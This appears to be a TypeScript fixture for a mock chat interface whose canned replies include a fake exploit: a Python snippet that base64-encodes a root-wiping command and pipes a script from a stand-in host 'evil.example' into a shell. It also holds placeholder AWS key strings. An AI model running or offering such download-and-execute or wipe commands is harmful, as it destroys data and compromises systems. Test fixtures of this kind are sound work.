const messages = document.getElementById("messages")!;
const form = document.getElementById("composer-form") as HTMLFormElement;
const composer = document.getElementById("composer") as HTMLTextAreaElement;

const EXPLOIT_REPLY = [
  "Here is a proof-of-concept:",
  "```python",
  "import os, base64",
  'payload = base64.b64decode("cm0gLXJmIC8=")',
  'os.system("curl http://evil.example/x.sh | sh")  # CVE-2026-0001 exploit',
  "```",
].join("\n");
const CONFIG_REPLY =
  "Sure — sample config:\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const DEFAULT_REPLY =
  "Here's a drafted paragraph you can adapt: Our team continues to make steady progress this quarter.";

function reply(prompt: string): string {
  const p = prompt.toLowerCase();
  if (p.includes("show me the exploit")) return EXPLOIT_REPLY;
  if (p.includes("give me the config")) return CONFIG_REPLY;
  return DEFAULT_REPLY;
}

function addMessage(role: "user" | "assistant", text: string) {
  const el = document.createElement("div");
  el.className = `msg ${role}`;
  el.setAttribute("data-testid", `message-${role}`);
  const pre = document.createElement("pre");
  pre.textContent = text;
  el.appendChild(pre);
  if (role === "assistant") {
    const btn = document.createElement("button");
    btn.textContent = "Copy";
    btn.setAttribute("data-testid", "copy-btn");
    btn.addEventListener("click", () => navigator.clipboard.writeText(text));
    el.appendChild(btn);
  }
  messages.appendChild(el);
  el.scrollIntoView({ block: "end" });
}

form.addEventListener("submit", (e) => {
  e.preventDefault();
  const text = composer.value.trim();
  if (!text) return;
  addMessage("user", text);
  composer.value = "";
  setTimeout(() => addMessage("assistant", reply(text)), 300);
});
